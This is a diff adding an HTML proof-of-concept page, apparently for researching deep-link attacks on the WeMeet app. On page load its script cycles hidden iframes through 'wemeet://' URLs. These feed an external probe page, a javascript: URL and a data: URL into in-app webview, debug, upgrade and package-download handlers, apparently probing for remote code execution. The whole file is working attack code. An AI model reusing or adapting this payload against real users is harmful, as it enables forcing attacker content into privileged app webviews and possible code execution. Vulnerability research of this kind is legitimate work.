@@ -1,0 +1,32 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>WM-POC-OK</title></head>
+<body><h1>WM-POC-P19</h1>
+<script>
+document.title='P19L-START';
+var atk='https://gitwhs.github.io/wm-poc-rce/probe19x.html';
+var jsurl='javascript:void(document.title="P19JS")';
+var dataurl='data:text/html,<html><head><title>P19DATA</title></head><body>data</body></html>';
+var schemes=[
+  'wemeet://page/docs?docs_list_url='+encodeURIComponent(atk)+'&url='+encodeURIComponent(atk),
+  'wemeet://page/docs_detail?url='+encodeURIComponent(atk),
+  'wemeet://page/live_record_play?url='+encodeURIComponent(atk),
+  'wemeet://page/operating_activities/main_process_webview?url='+encodeURIComponent(atk),
+  'wemeet://page/realtime_caption_webview?url='+encodeURIComponent(atk),
+  'wemeet://page/profile/aboutus/x5_debug?url='+encodeURIComponent(jsurl),
+  'wemeet://page/profile/aboutus/x5_debug?url='+encodeURIComponent(dataurl),
+  'wemeet://page/upgrade_app?url='+encodeURIComponent(atk),
+  'wemeet://page/package_download?url='+encodeURIComponent(atk)
+];
+var i=0;
+function fire(){
+  if(i>=schemes.length){ document.title='P19L-DONE-IFRAMES'; return; }
+  var s=schemes[i++];
+  document.title='P19L-IFRAME-'+i;
+  var f=document.createElement('iframe');
+  f.src=s;
+  document.body.appendChild(f);
+  setTimeout(fire, 2500);
+}
+setTimeout(fire, 800);
+</script>
+</body></html>
